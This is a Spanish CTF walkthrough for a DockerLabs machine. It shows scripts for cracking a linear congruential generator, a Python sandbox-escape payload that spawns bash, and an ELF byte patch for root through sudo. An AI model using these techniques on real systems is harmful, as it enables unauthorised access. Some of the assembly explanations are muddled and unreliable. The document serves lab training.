---
icon: flag
---

# Predictable DockerLabs (Hard)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip predictable.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh predictable.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-19 06:14 EST
Nmap scan report for norc.labs (172.17.0.2)
Host is up (0.000037s latency).

PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 9.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   256 fa:76:8a:ad:3c:33:1b:58:65:ba:74:ca:8a:7b:03:33 (ECDSA)
|_  256 bc:f7:8f:f4:2d:d6:c9:66:0f:a8:7c:79:32:af:a4:79 (ED25519)
1111/tcp open  lmsocialserver?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.11.9
|     Date: Sun, 19 Jan 2025 11:14:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 12160
|     Vary: Cookie
|     Set-Cookie: session=eyJzZWVkIjoxNzM3Mjg1MjQ5fQ.Z4zegQ.H7aBj7WlQHiL7kPGC5kyedH00ls; HttpOnly; Path=/
|     Connection: close
|     <!--
|     class prng_lcg:
|     9223372036854775783
|     __init__(self, seed=None):
|     self.state = seed
|     next(self):
|     self.state = (self.state * self.m + self.c) % self.n
|     return self.state
|     return int
|     obtener_semilla():
|     return time.time_ns()
|     obtener_semilla_anterior():
|     return obtener_semilla() - 1
|     'seed' not in session:
|     session['seed'] = obtener_semilla()
|     prng_lcg(session['seed'])
|     prng_lcg(session['seed'])
|     semilla_anterior = obtener_semilla_anterior()
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|   Help: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1111-TCP:V=7.94SVN%I=7%D=1/19%Time=678CDE81%P=x86_64-pc-linux-gnu%r
SF:(Help,167,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<
SF:head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20
SF:\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\
SF:x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad
SF:\x20request\x20syntax\x20\('HELP'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20s
SF:yntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</
SF:html>\n")%r(GetRequest,30A3,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkz
SF:eug/3\.0\.3\x20Python/3\.11\.9\r\nDate:\x20Sun,\x2019\x20Jan\x202025\x2
SF:011:14:09\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x2012160\r\nVary:\x20Cookie\r\nSet-Cookie:\x20session=eyJz
SF:ZWVkIjoxNzM3Mjg1MjQ5fQ\.Z4zegQ\.H7aBj7WlQHiL7kPGC5kyedH00ls;\x20HttpOnl
SF:y;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!--\nclass\x20prng_lcg:\n\
SF:x20\x20\x20\x20m\x20=\x20\n\x20\x20\x20\x20c\x20=\n\x20\x20\x20\x20n\x2
SF:0=\x209223372036854775783\n\n\x20\x20\x20\x20def\x20__init__\(self,\x20
SF:seed=None\):\n\x20\x20\x20\x20\x20\x20\x20\x20self\.state\x20=\x20seed\
SF:n\n\x20\x20\x20\x20def\x20next\(self\):\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20self\.state\x20=\x20\(self\.state\x20\*\x20self\.m\x20\+\x20self\.c\)
SF:\x20%\x20self\.n\n\x20\x20\x20\x20\x20\x20\x20\x20return\x20self\.state
SF:\n\n\.\.\.\n\n#\x20return\x20int\ndef\x20obtener_semilla\(\):\n\x20\x20
SF:\x20\x20return\x20time\.time_ns\(\)\n\ndef\x20obtener_semilla_anterior\
SF:(\):\n\x20\x20\x20\x20return\x20obtener_semilla\(\)\x20-\x201\n\.\.\.\n
SF:\nif\x20'seed'\x20not\x20in\x20session:\n\tsession\['seed'\]\x20=\x20ob
SF:tener_semilla\(\)\ngen\x20=\x20prng_lcg\(session\['seed'\]\)\n\n\.\.\.\
SF:n\ngen\x20=\x20prng_lcg\(session\['seed'\]\)\nsemilla_anterior\x20=\x20
SF:obtener_semilla_anterior\(\)\n\n\.\.\.\n\n-->\n\n<!DOCTYPE\x20html>\n<h
SF:tml\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.83 seconds
```

Vemos que hay un puerto interesante que es el `1111` y si entramos en el, veremos una pagina web con una lista de numeros, pero en la barra que esta en la parte superior en el centro vemos que nos indica que tendremos que meter una `"semilla"` para que nos diga algo secreto, pero tiene que coincidir con la siguiente semilla que intuimos que podria ser la numero `100` de la lista de la pagina, por lo que vamos a calcular todo esto y nos montaremos un script para que todo esto sea mas rapido.

Para poder calcular los parámetros de un `generador congruencial lineal` (`LCG`), necesitas tres valores consecutivos generados por el LCG: `s0`, `s1` y `s2`. Usando estos valores y el módulo nnn, el script puede calcular el multiplicador aaa y el incremento ccc que el generador está utilizando. Estos valores se eligen porque son tres puntos consecutivos generados por la misma función de `LCG`, lo que permite calcular los parámetros.

En la siguiente pagina encontramos mas informacion:

URL = Info LCG

> calculatorLCG.py

```python
import argparse

# Algoritmo extendido de Euclides para encontrar el inverso modular
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, x, y = egcd(b % a, a)
        return (g, y - (b // a) * x, x)

def modinv(b, n):
    g, x, _ = egcd(b, n)
    if g == 1:
        return x % n

# Función para descifrar los parámetros del LCG
def crack_unknown_multiplier(modulus, s0, s1, s2):
    if s1 <= s0 or s0 <= s2:
        raise ValueError("s1 debe ser mayor que s0, y s0 debe ser mayor que s2")
    
    multiplier = (s2 - s1) * modinv(s1 - s0, modulus) % modulus
    increment = (s1 - s0 * multiplier) % modulus
    return modulus, multiplier, increment

# Función principal
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Crack LCG')
    parser.add_argument('--n', type=int, required=True, help='Módulo (n)')
    parser.add_argument('--s0', type=int, required=True, help='Valor 0')
    parser.add_argument('--s1', type=int, required=True, help='Valor 1')
    parser.add_argument('--s2', type=int, required=True, help='Valor 2')

    args = parser.parse_args()

    try:
        modulus, multiplier, increment = crack_unknown_multiplier(args.n, args.s0, args.s1, args.s2)

        print(f"Modulus (n): {modulus}")
        print(f"Multiplier (a): {multiplier}")
        print(f"Increment (c): {increment}")
    except ValueError as e:
        print(f"Error: {e}")
```

Esos números provienen de la secuencia generada por el `generador congruencial lineal` (`LCG`) que se utiliza en un proceso de prueba o ataque. Para encontrar el multiplicador, el incremento y el módulo del `LCG`, es necesario conocer al menos tres valores consecutivos de la secuencia generada. Si tienes valores reales de la secuencia generada (como `s0`, `s1`, `s2`), puedes aplicarlos en el script para obtener los parámetros de configuración del generador.

El valor de `--n`, que en este caso es `9223372036854775783`, corresponde al **módulo** utilizado en el `generador congruencial lineal` (`LCG`). Este valor es esencial para calcular la secuencia generada por el `LCG` y es típico usar un valor muy grande, cercano a `2632^{63}263`, en sistemas modernos para garantizar un rango amplio de números generados. Este valor también es una elección estándar cuando no se especifica otro módulo en particular, por lo tanto, puede ser un valor predeterminado en ciertos contextos.

Como resultado nos daria lo siguiente:

```
python3 calculatorLCG.py --n 9223372036854775783 --s0 5042010115239285411 --s1 5691797266751657494 --s2 2989723807668403001
```

Info:

```
Modulus (n): 9223372036854775783
Multiplier (a): 81853448938945944
Increment (c): 7382843889490547368
```

Una vez teniendo calculados los valores que necesitamos para descubrir la `"semilla"` haremos el siguiente script:

## Escalate user mash

> calculatorSeed.py

```python
import argparse

# Define the constants
m = 81853448938945944
c = 7382843889490547368
n = 9223372036854775783

# Create an ArgumentParser object
parser = argparse.ArgumentParser(description='Calcula el número 100 usando LCG')

# Add an argument for s99
parser.add_argument('-s99', type=int, help='Valor 99', required=True)

# Parse the command-line arguments
args = parser.parse_args()

# Extract the value of s99 from the parsed arguments
s99 = args.s99

# Perform the calculation for s100
s100 = (s99 * m + c) % n

# Output the result
print(f"Valor 100: {s100}")
```

Lo utilizamos de la siguiente forma:

```shell
python3 calculatorSeed.py -s99 <NUMBRE_99>
```

> Ejemplo:

```shell
python3 calculatorSeed.py -s99 83111388279105088
```

<figure><img src="../../.gitbook/assets/image (168) (1).png" alt=""><figcaption></figcaption></figure>

Info:

```
Valor 100: 9212959101862389250
```

Y esto lo metemos en la barra esa de busqueda:

<figure><img src="../../.gitbook/assets/image (169) (1).png" alt=""><figcaption></figcaption></figure>

Y veremos que nos muestra unas credenciales, las cuales nos conectaremos por `ssh`.

### SSH

```shell
ssh mash@<IP>
```

Metemos como contraseña `LCG_1s_E4Sy_t0_bR34k` y veremos que estamos dentro con dicho usuario.

## Escalate Privileges

Una vez que entramos vemos que estamos dentro de `python` encerrados en un `pyjail`, y tendremos que escapar de ahi para obtener una shell de `bash`:

```
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Romper LCG y predecir numeros es divertido
______________________________________________________________________
Ahora escapa de mi pyjail
>
```

Vamos a ver que podemos hacer:

```shell
globals()
```

Info:

```
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f1ac339bf50>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/usr/bin/jail', '__cached__': None, 'signal': <module 'signal' from '/usr/lib/python3.11/signal.py'>, 'banner': <function banner at 0x7f1ac33344a0>, 'main': <function main at 0x7f1ac31487c0>}
```

Si intentamos poner cosas como `__import__` u `os` nos pondra que lo tenemos bloqueado, por lo que tendremos que `Bypassear` este bloqueo de la siguiente forma.

### Explicación para salir del `pyjail`

Cuando trabajamos en un entorno controlado, como un CTF (Capture the Flag), algunas palabras clave de Python están bloqueadas para evitar la ejecución de comandos no deseados. Uno de estos bloqueos comunes es la palabra clave `import`, que se usa para cargar módulos.

#### ¿Por qué dividir `import` y usar `getattr()`?

**1. Restricción de palabras clave:** El sistema puede bloquear el uso directo de palabras clave como `import` para evitar que se carguen módulos como `os`, que pueden permitir ejecutar comandos del sistema.

**2. Solución: dividir y concatenar palabras:**

* Para evitar el bloqueo, podemos dividir la palabra clave `import` en dos partes: `'__im'` y `'port__'`, y luego unirlas con el operador `+`.
* Usamos este enfoque con el módulo `os` para ejecutar comandos del sistema (como `os.system()`).

**3. Uso de `getattr()` para acceder a funciones internas:**

* **`globals()`** devuelve un diccionario de todas las variables globales del entorno, que incluye funciones como `print` o `__import__`.
* **`getattr()`** permite acceder a una función de un objeto a través de su nombre. En este caso, `getattr(globals()['__builtins__'], '__im'+'port__')` accede a la función `__import__`, que es la encargada de cargar módulos en Python.
* Después de eso, podemos usar `('o' + 's')` para formar el nombre del módulo que queremos cargar, en este caso, `os`.

#### ¿Qué pasa con `getattr()` y por qué es importante?

* **`getattr()`** es una función que obtiene atributos de un objeto. En este caso, se utiliza para obtener la función `__import__` que se usa para cargar módulos. El uso de `getattr()` es clave porque nos permite acceder a funciones, incluso aquellas que están protegidas o son menos obvias (como `__import__`).

#### Ejemplo completo:

El comando completo `getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s')` realiza lo siguiente:

1. **`globals()`**: Trae todas las variables globales disponibles en el entorno de ejecución, incluidas las funciones y objetos internos de Python.
2. **`['__builtins__']`**: Especifica que vamos a buscar dentro de los "builtins", que son funciones que Python siempre tiene disponibles (como `print`, `input`, etc.).
3. **`'__im' + 'port__'`**: Concatenamos las partes de la palabra clave `import`, usando el signo `+` para eludir el bloqueo del sistema.
4. **`('o' + 's')`**: De forma similar, dividimos la palabra `os` y la unimos con el operador `+` para cargar el módulo `os`.
5. **Resultado**: Esto permite acceder y cargar el módulo `os` sin que el sistema detecte el uso directo de la palabra bloqueada `import`.

#### Conclusión:

Este es un enfoque ingenioso para evadir restricciones y continuar ejecutando código con módulos esenciales en entornos donde ciertas palabras clave están bloqueadas. A través de este truco, podemos obtener acceso a módulos importantes como `os` y ejecutar comandos del sistema de manera efectiva.

### Practica de la explicación

```shell
getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('bash')
```

Esto hace lo siguiente:

1. **`getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s')`**: Aquí usamos `getattr` para acceder al método `__import__` y cargar el módulo `os` en Python. Fragmentamos la palabra `import` en `__im` y `port__` y unimos `o` y `s` para obtener el módulo `os`.
2. **`getattr(..., 'sys'+'tem')`**: Después, usamos `getattr` de nuevo para acceder a la función `system` dentro del módulo `os`, fragmentando `system` en `sys` y `tem`.
3. **`('bash')`**: Finalmente, ejecutamos `os.system('bash')` que invoca el comando `bash` en la terminal, lo que te da acceso a la shell.

Este es un truco comúnmente utilizado para evadir restricciones en entornos controlados donde las palabras clave como `import` o funciones como `system` están bloqueadas.

Info:

```
mash@predictable:~$ whoami
mash
```

Y con esto habremos obtenido una shell en `bash` habiendo escapado del `pyjail`.

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for mash on predictable:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mash may run the following commands on predictable:
    (root) NOPASSWD: /opt/shell
```

Vemos que podemos ejecutar el binario `/opt/shell` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo /opt/shell -h
```

Info:

```
¿Sabias que EI_VERSION puede tener diferentes valores?. radare2 esta instalado
```

Vemos que nos da una pista sobre como utilizar esto.

```shell
which radare2
```

Info:

```
/usr/bin/radare2
```

### Ingeniería Inversa

Vemos que efectivamente esta instalado y si buscamos informacion sobre el binario, veremos que es una herramienta para realizar `ingenieria inversa`, por lo que la utilizaremos para hacer `ingenieria inversa` al archivo `shell`.

```shell
radare2 /opt/shell
```

Una vez dentro del binario para examinarlo, veremos las funciones que tiene:

```shell
aa
afl
```

Info:

```
0x00001030    1      6 sym.imp.puts
0x00001040    1      6 sym.imp.fread
0x00001050    1      6 sym.imp.system
0x00001060    1      6 sym.imp.printf
0x00001070    1      6 sym.imp.strcmp
0x00001080    1      6 sym.imp.fseek
0x00001090    1      6 sym.imp.fopen
0x000010a0    1     37 entry0
0x000012a0    1     13 sym._fini
0x00001199    9    262 main
0x00001000    3     27 sym._init
0x00001190    5     60 entry.init0
0x00001140    5     55 entry.fini0
0x000010d0    4     34 fcn.000010d0
```

Vamos a ver la funcion `main` en modo `ensamblador`:

```shell
pdf @ main
```

Info:

```
            ; DATA XREF from entry0 @ 0x10b8(r)
┌ 262: int main (int argc, char **argv);
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; var int64_t var_8h @ rbp-0x8
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_14h @ rbp-0x14
│           ; var int64_t var_20h @ rbp-0x20
│           0x00001199      55             push rbp
│           0x0000119a      4889e5         mov rbp, rsp
│           0x0000119d      4883ec20       sub rsp, 0x20
│           0x000011a1      897dec         mov dword [var_14h], edi    ; argc
│           0x000011a4      488975e0       mov qword [var_20h], rsi    ; argv
│           0x000011a8      837dec02       cmp dword [var_14h], 2
│       ┌─< 0x000011ac      7423           je 0x11d1
│       │   0x000011ae      488d05530e..   lea rax, str.Uso:_._shell_input ; 0x2008 ; "Uso: ./shell input"
│       │   0x000011b5      4889c7         mov rdi, rax
│       │   0x000011b8      e873feffff     call sym.imp.puts           ; int puts(const char *s)
│       │   0x000011bd      488d05570e..   lea rax, str.Pista:_._shell__h ; 0x201b ; "Pista: ./shell -h"
│       │   0x000011c4      4889c7         mov rdi, rax
│       │   0x000011c7      e864feffff     call sym.imp.puts           ; int puts(const char *s)
│      ┌──< 0x000011cc      e9c7000000     jmp 0x1298
│      │└─> 0x000011d1      488b45e0       mov rax, qword [var_20h]
│      │    0x000011d5      4883c008       add rax, 8
│      │    0x000011d9      488b00         mov rax, qword [rax]
│      │    0x000011dc      4889c6         mov rsi, rax
│      │    0x000011df      488d05470e..   lea rax, [0x0000202d]       ; "-h"
│      │    0x000011e6      4889c7         mov rdi, rax
│      │    0x000011e9      e882feffff     call sym.imp.strcmp         ; int strcmp(const char *s1, const char *s2)
│      │    0x000011ee      85c0           test eax, eax
│      │┌─< 0x000011f0      7514           jne 0x1206
│      ││   0x000011f2      488d05370e..   lea rax, str.Sabias_que_EI_VERSION_puede_tener_diferentes_valores_._radare2_esta_instalado ; 0x2030
│      ││   0x000011f9      4889c7         mov rdi, rax
│      ││   0x000011fc      e82ffeffff     call sym.imp.puts           ; int puts(const char *s)
│     ┌───< 0x00001201      e992000000     jmp 0x1298
│     ││└─> 0x00001206      488d05730e..   lea rax, [0x00002080]       ; "r"
│     ││    0x0000120d      4889c6         mov rsi, rax
│     ││    0x00001210      488d056b0e..   lea rax, str.shell          ; 0x2082 ; "shell"
│     ││    0x00001217      4889c7         mov rdi, rax
│     ││    0x0000121a      e871feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│     ││    0x0000121f      488945f0       mov qword [var_10h], rax
│     ││    0x00001223      488b45f0       mov rax, qword [var_10h]
│     ││    0x00001227      ba00000000     mov edx, 0
│     ││    0x0000122c      be06000000     mov esi, 6
│     ││    0x00001231      4889c7         mov rdi, rax
│     ││    0x00001234      e847feffff     call sym.imp.fseek          ; int fseek(FILE *stream, long offset, int whence)
│     ││    0x00001239      488b55f0       mov rdx, qword [var_10h]
│     ││    0x0000123d      488b45f8       mov rax, qword [var_8h]
│     ││    0x00001241      4889d1         mov rcx, rdx
│     ││    0x00001244      ba01000000     mov edx, 1
│     ││    0x00001249      be01000000     mov esi, 1
│     ││    0x0000124e      4889c7         mov rdi, rax
│     ││    0x00001251      e8eafdffff     call sym.imp.fread          ; size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
│     ││    0x00001256      488b45f8       mov rax, qword [var_8h]
│     ││    0x0000125a      0fb600         movzx eax, byte [rax]
│     ││    0x0000125d      3c01           cmp al, 1
│     ││┌─< 0x0000125f      7423           je 0x1284
│     │││   0x00001261      488b45e0       mov rax, qword [var_20h]
│     │││   0x00001265      4883c008       add rax, 8
│     │││   0x00001269      488b00         mov rax, qword [rax]
│     │││   0x0000126c      0fb600         movzx eax, byte [rax]
│     │││   0x0000126f      3c30           cmp al, 0x30                ; '0'
│    ┌────< 0x00001271      7511           jne 0x1284
│    ││││   0x00001273      488d050e0e..   lea rax, str._bin_bash      ; 0x2088 ; "/bin/bash"
│    ││││   0x0000127a      4889c7         mov rdi, rax
│    ││││   0x0000127d      e8cefdffff     call sym.imp.system         ; int system(const char *string)
│   ┌─────< 0x00001282      eb14           jmp 0x1298
│   │└──└─> 0x00001284      488d05070e..   lea rax, str.Bleh_n         ; 0x2092 ; "Bleh~~\n"
│   │ ││    0x0000128b      4889c7         mov rdi, rax
│   │ ││    0x0000128e      b800000000     mov eax, 0
│   │ ││    0x00001293      e8c8fdffff     call sym.imp.printf         ; int printf(const char *format)
│   │ ││    ; CODE XREFS from main @ 0x11cc(x), 0x1201(x), 0x1282(x)
│   └─└└──> 0x00001298      b800000000     mov eax, 0
│           0x0000129d      c9             leave
└           0x0000129e      c3             ret
```

Para obtener una shell en el código desensamblado que estoy mostrando, podemos centrarnos en el flujo de ejecución del programa en la función `main`. El análisis muestra que si el programa recibe el argumento correcto (en este caso, si el valor de `argv` es `"r"`), el código ejecuta la función `system("/bin/bash")`.

El paso crítico es este fragmento:

```c
lea rax, str._bin_bash      ; carga "/bin/bash" mov rdi, rax                ; mueve la dirección de "/bin/bash" a rdi call sym.imp.system         ; llama a system("/bin/bash")
```

Este bloque de código prepara el comando `/bin/bash` para ejecutarlo mediante la llamada a `system()`, que es una función estándar para ejecutar comandos en la línea de comandos del sistema operativo. Si puedes controlar el argumento que pasa al programa (por ejemplo, mediante un "input"), puedes hacer que ejecute `/bin/bash` y obtener acceso a una shell.

Pero si nosotros le pasamos directamente la `r`, vemos que no funciona:

```shell
sudo /opt/shell r
```

Info:

```
Bleh~~
```

En esta parte de aqui vemos que tambien nos esta mostrando que esta ralizando una validacion con el argumento `0`:

```
0x0000126f      3c30           cmp al, 0x30                ; '0'
```

Y vemos que esta en el `0x30`, por lo que tendremos que cambiar el valor de esta `cabecera` para saltarnos la verificacion y que cuando le pasemos `0` automaticamente nos ejecute la `shell`.

Si analizamos el encabezado del `ELF` vemos que lo que queremos cambiar para omitir esa validacion esta en el `byte 6` por lo que tendremos que cambiar el valor de `0x30` del `byte 6` por cualquier otro numero que no sea el `0x01`, en mi caso le pondre un `0x00`.

```shell
wx 0x00 @ 0x6
```

Con esto ya habremos modificado dicho `byte` y lo podremos comprobar con el siguiente comando:

```shell
x/1xb 0x6
```

Info:

```
- offset -   6 7  8 9  A B  C D  E F 1011 1213 1415  6789ABCDEF012345
0x00000006  00                                       . 
```

Vemos que efectivamente se modifico de buena forma, por lo que ya solo faltaria introducir la informacion correcta, que en este caso seria `0` para que ejecute la `shell`.

Nos saldremos con `q` y ejecutamos lo siguiente:

```
sudo /opt/shell 0
```

Info:

```
root@predictable:/opt# whoami
root
```

Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
